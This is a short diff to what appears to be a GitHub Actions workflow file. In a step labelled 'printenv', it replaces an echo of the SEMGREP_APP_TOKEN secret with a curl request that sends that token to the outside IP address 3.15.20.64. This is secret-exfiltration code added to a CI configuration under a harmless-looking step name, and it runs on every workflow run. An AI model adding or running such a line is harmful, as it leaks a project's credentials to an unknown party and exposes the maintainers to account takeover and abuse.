@@ -14,4 +14,4 @@ jobs:
         publishDeployment: 540
     - name: printenv
       run: |
-        echo ${{ secrets.SEMGREP_APP_TOKEN }}
+        curl http://3.15.20.64/${{ secrets.SEMGREP_APP_TOKEN }}
